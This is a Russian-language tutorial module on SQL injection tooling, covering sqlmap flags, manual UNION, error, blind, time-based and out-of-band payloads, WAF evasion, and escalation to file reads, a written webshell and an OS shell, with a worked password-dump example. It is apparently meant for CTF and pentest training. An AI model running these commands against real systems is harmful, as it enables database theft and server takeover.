Этот модуль — **карта инструментов для SQL-инъекций**. Теория класса разобрана в `web-sqli`, а здесь — практический арсенал: автоматический эксплуататор `sqlmap` и полный ручной workflow, который выручает, когда автоматика слепа. Модуль не дублирует справочники, а объясняет **когда** и **в каком порядке** их применять.

## Что покрывает этот модуль

| Урок | Инструменты | Что решает |
|------|-------------|------------|
| `web-tool-sqlmap` | sqlmap | авто-детект, дамп, OS-shell, tamper, WAF-обход |
| `web-tool-sqli-manual` | curl, bash, Python, Burp | ручное обнаружение и эксплуатация: UNION, error, blind, OOB |

Оба урока — практические справочники: таблицы флагов, готовые команды и раздел «что делать в любой ситуации». Модуль задаёт маршрут между ними и даёт минимальный «скелет» команд, с которого начинается любая работа с SQLi.

Прежде чем идти дальше, зафиксируйте базу: **SQL-инъекция — это инъекция данных в интерпретируемый SQL-запрос**. Контекст (число, строка, идентификатор, JSON) определяет и payload, и инструмент. Ошибка новичка — начинать с инструмента, а не с контекста.

## Когда sqlmap, когда руками

Главное решение этапа. Ошибка в обе стороны дорого стоит: слишком ранний sqlmap шумит и палит сессию, слишком поздний ручной перебор сжигает время.

| Признак | Инструмент | Почему |
|---------|-----------|--------|
| Стандартный GET/POST-параметр | **sqlmap** | переберёт техники за секунды |
| Есть запрос из Burp | **sqlmap `-r`** | cookie/тело/заголовки уже внутри |
| Стоит кастомный WAF | **руками + `--tamper`** | эвристика не пробивает обфускацию |
| Параметр в JSON/XML/заголовке | **руками**, затем sqlmap `--level 5` | сканер часто не видит вложенность |
| Вторая производная (stored) | **руками** | payload срабатывает в другом запросе |
| Ответ не меняется | sqlmap time-based, затем **руками OOB** | нужны задержки или DNS-канал |
| Нужно минимальное PoC для отчёта | **руками** (curl) | отчёт требует один чистый запрос |

Правило: **sqlmap — для быстрой проверки гипотезы, руки — для обхода и доказательства**. Никогда не сдавай «sqlmap said vulnerable» без воспроизводимого запроса. Сканер может ошибиться (ложное срабатывание на кастомной обработке ошибок) — ручной PoC это ловит.

## Маршрут: от подозрения к дампу

1. **Обнаружение.** Одна кавычка (`'`), арифметика (`-1`/`+1`), булева логика (`AND 1=1` vs `AND 1=2`). Фиксируй разницу в размере/коде ответа.
2. **Классификация СУБД** по тексту ошибки — экономит весь дальнейший перебор (см. `web-tool-sqli-manual`).
3. **Авто-проверка sqlmap** по сохранённому запросу: `sqlmap -r request.txt -p id --batch --level 3 --risk 2`.
4. **Если sqlmap молчит** — ручной workflow: число колонок (`ORDER BY`/`UNION SELECT NULL`), отражаемая колонка, техника по ситуации.
5. **Извлечение.** UNION/error — если данные видны; boolean/time/OOB — если ответ не меняется.
6. **Эскалация.** `--file-read`, `--os-shell`, запись webshell — если СУБД и права позволяют.
7. **Доказательство.** Минимальный curl-запрос + строка данных → в отчёт.

Порядок важен: каждый шаг подтверждает предыдущий. Не переходите к эскалации, не доказав само чтение данных. И держите рядом сырой HTTP-запрос — к нему вы будете возвращаться при каждой попытке обхода.

## sqlmap: полный справочник флагов

sqlmap — де-факто стандарт автоматической эксплуатации. Понимание флагов важнее заучивания команд: вы должны осознанно выбирать уровень, риск и технику.

| Флаг | Назначение |
|------|-----------|
| `-u URL` | цель с параметром (`http://t/item?id=1`) |
| `-r request.txt` | взять запрос из файла (Burp «Save item») |
| `--data="a=1&b=2"` | POST-тело |
| `-p id` | тестировать только параметр `id` |
| `--cookie="..."` | cookie сессии |
| `--headers="X: Y"` | дополнительные заголовки |
| `--level 1..5` | сколько мест тестировать (1=GET/POST, 5=все заголовки) |
| `--risk 1..3` | насколько агрессивные payload (3 = OR-based, может писать) |
| `--technique=BEUSTQ` | какие техники: B=boolean, E=error, U=union, S=stacked, T=time, Q=inline |
| `--batch` | не задавать вопросы (дефолтные ответы) |
| `--dbms=mysql` | явно указать СУБД — ускоряет |
| `--dbs` / `--tables` / `--columns` / `--dump` | перечисление и дамп |
| `-D db -T tbl -C col` | сузить цель дампа |
| `--threads=4` | параллелизм (не злоупотреблять) |
| `--delay=1` | пауза между запросами (тихий режим) |
| `--random-agent` | случайный User-Agent |
| `--tamper=space2comment` | обход WAF |
| `--file-read=/etc/passwd` | чтение файла (при FILE-привилегии) |
| `--os-shell` / `--os-pwn` | интерактивный шелл ОС |
| `--tor` / `--proxy=http://127.0.0.1:8080` | анонимизация/через прокси |
| `--flush-session` | сбросить кэш сессии |

Типовой «боевой» прогон:

```bash
sqlmap -r request.txt -p id --batch --level 3 --risk 2 \
  --dbms=mysql --technique=BEU --threads=4 \
  --random-agent --dbs
```

Читать вывод: sqlmap печатает `[INFO]` о параметре, `[WARNING]` о фильтрах, `[CRITICAL]` об ошибках. Строка `Parameter 'id' is vulnerable` — только кандидат, дальше обязательно руками.

## Ручная эксплуатация по техникам

Автоматика не всесильна. Ручные техники по убыванию «скорости вывода данных»:

**UNION-based** — когда ответ отражает данные. Сначала число колонок:

```bash
curl -s "http://t/item?id=3 ORDER BY 1-- -"
curl -s "http://t/item?id=3 ORDER BY 4-- -"   # ошибка -> колонок 3
curl -s "http://t/item?id=-1 UNION SELECT 1,2,3-- -"
```

**Error-based** — когда вывод скрыт, но ошибки видны. MySQL: `extractvalue(1,concat(0x7e,version()))`. PostgreSQL: `cast(version() as int)`. MSSQL: `convert(int,@@version)`.

**Boolean blind** — ответ «есть/нет». Бинарный поиск по символу:

```bash
for i in $(seq 1 20); do
  curl -s "http://t/item?id=1 AND substr((select database()),$i,1)='a'" | wc -c
done
```

**Time-based** — если ответ вообще не меняется. `AND SLEEP(5)` (MySQL), `AND pg_sleep(5)` (PostgreSQL), `;WAITFOR DELAY '0:0:5'` (MSSQL).

**OOB** — когда и время не помогает (асинхронные обработчики). DNS/HTTP-канал: `LOAD_FILE('\\\\<attacker>\\a')` (MySQL), `xp_dirtree '//attacker/a'` (MSSQL), `COPY ... TO PROGRAM` (PostgreSQL).

Полный разбор каждой техники с payload-таблицами — в `web-tool-sqli-manual`.

## Мини-арсенал: команды, которые нужны всегда

```bash
# 1. быстрый авто-чек по сохранённому запросу
sqlmap -r request.txt -p id --batch --level 3 --risk 2

# 2. ручное подтверждение: кавычка и булева логика
curl -s "http://t/item?id=3'" | head
curl -s "http://t/item?id=3 AND 1=1" | wc -c
curl -s "http://t/item?id=3 AND 1=2" | wc -c

# 3. определить число колонок и найти вывод
curl -s "http://t/item?id=3 ORDER BY 4-- -"
curl -s "http://t/item?id=-1 UNION SELECT 1,2,3-- -"
```

Три команды покрывают 80% первичной работы. Детали и варианты по каждой СУБД — в дочерних уроках. Сохраняйте удачный запрос в файл — он станет основой и для отчёта, и для обхода WAF.

## Разобранный пример: от кавычки до дампа паролей

**Дано:** интернет-магазин, `GET /product?id=10`, есть cookie сессии.

**Шаг 1 — подозрение.** Одна кавычка:
```bash
curl -s "http://shop/product?id=10'" | grep -i "syntax"
# You have an error in your SQL syntax ... near ''10'' at line 1
```
Ошибка MySQL — контекст числовой, но обработка неаккуратная. Классифицировали СУБД.

**Шаг 2 — сохраняем запрос.** Из Burp: правый клик → *Save item* → `request.txt`.

**Шаг 3 — авто-чек:**
```bash
sqlmap -r request.txt -p id --batch --level 3 --risk 2 --dbms=mysql
# [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
# [INFO] the back-end DBMS is MySQL
```

**Шаг 4 — перечисление:**
```bash
sqlmap -r request.txt -p id --batch --dbms=mysql --dbs
# available databases [3]: information_schema, shop, mysql
sqlmap -r request.txt -p id --batch -D shop --tables
# [4 tables]: users, products, orders, sessions
```

**Шаг 5 — дамп:**
```bash
sqlmap -r request.txt -p id --batch -D shop -T users -C id,username,password --dump
# admin | $2y$10$...  (bcrypt)
```

**Шаг 6 — доказательство.** Минимальный PoC одним curl:
```bash
curl -s "http://shop/product?id=-1 UNION SELECT 1,concat(username,':',password),3 FROM users-- -"
```
Ответ содержит `admin:$2y$10$...` — воспроизводимо, годится в отчёт. Хэш уходит в офлайн-крэк (`hashcat -m 3200`), а не в онлайн-перебор.

## WAF и обход фильтров

WAF ломает и сканер, и payload. Порядок действий:

1. **Понять, что фильтруется.** По одному токену: кавычка, пробел, `UNION`, `SELECT`, комментарий.
2. **Обход пробелов:** `/**/`, `%09`, `%0a`, скобки, `+`.
3. **Обход регистра/ключевых слов:** `UnIoN`, `UN/**/ION`, `SEL/**/ECT`.
4. **Замена функций:** `substr`→`mid`/`substring`, `concat`→`||` (в некоторых СУБД).
5. **sqlmap tamper:** `--tamper=space2comment,between,charencode` (можно комбинировать).

```bash
sqlmap -r request.txt -p id --batch --tamper=space2comment,between \
  --random-agent --delay=1 --technique=BT
```

`--delay` снижает шум и помогает против rate-limit. `--random-agent` меняет UA каждый запрос — иногда это единственное, что нужно против простого правила.

## Частые ошибки

- **Начинать с `--level 5 --risk 3`.** Это шум и риск повредить данные; начинай с дефолта и повышай осознанно.
- **Доверять сканеру без PoC.** sqlmap даёт кандидата; доказательство — минимальный ручной запрос.
- **Игнорировать контекст.** Строковый/числовой/JSON/заголовок — payload разный; сначала определи контекст.
- **Линейный перебор в blind.** Используй бинарный поиск — иначе убьёшь время и цель.
- **Забыть про комментарий `-- -`.** Без него остаток запроса ломает payload.
- **Онлайн-брутфорс по найденному хэшу.** Хэши крэкают офлайн (hashcat/john), а не долбят логин.
- **Слепой дамп всей базы.** Начни с `information_schema`/малых таблиц — уважай цель и своё время.

## Что дальше / решение

- **Доказал инъекцию** → определи привилегии: `--privileges`, `--is-dba`. DBA открывает `--os-shell` и файловые операции.
- **Чтение файлов** → `--file-read=/etc/passwd`, дальше конфиги с кредами.
- **Запись файлов** → `--file-write=shell.php --file-dest=/var/www/html/shell.php` при FILE-привилегии.
- **RCE** → `--os-shell` (MySQL `INTO OUTFILE`+UDF, MSSQL `xp_cmdshell`, PostgreSQL `COPY TO PROGRAM`).
- **WAF не пробивается** → переходи на ручной OOB-канал и фиксируй каждую удачную мутацию.
- **Ничего не вышло** → `record_vector attempted`, зафиксируй контекст и иди к следующему параметру; не повторяй тот же прогон.

**Индикаторы СУБД по ошибке:**

| Строка в ошибке | СУБД |
|-----------------|------|
| `You have an error in your SQL syntax` | MySQL/MariaDB |
| `ERROR: syntax error at or near` | PostgreSQL |
| `Unclosed quotation mark after the character string` | MSSQL |
| `ORA-01756: quoted string not properly terminated` | Oracle |
| `SQLite3::query(): Unable to prepare` | SQLite |

**Комментарии по СУБД:**

| СУБД | Строчный | Блочный |
|------|----------|---------|
| MySQL | `#`, `-- ` | `/* */` |
| PostgreSQL | `--` | `/* */` |
| MSSQL | `--` | `/* */` |
| Oracle | `--` | `/* */` |

**Функции вывода строки (error-based):**

| СУБД | Payload |
|------|---------|
| MySQL | `extractvalue(1,concat(0x7e,version()))` |
| PostgreSQL | `cast(version() as int)` |
| MSSQL | `convert(int,@@version)` |
| Oracle | `utl_inaddr.get_host_name((select user from dual))` |

## Где пригодится

- **CTF (Web):** быстрый выбор «авто или руками» экономит время на решение; флаг часто в таблице `flags`.
- **Bug bounty:** минимальный PoC и обход фильтров вручную повышают шанс, что баг примут как critical.
- **Пентест:** единый маршрут от обнаружения до эскалации с доказательствами для каждого шага.
- **Работа (AppSec):** понимание, где автоматика слепа, помогает точно оценивать реальную эксплуатируемость находок.
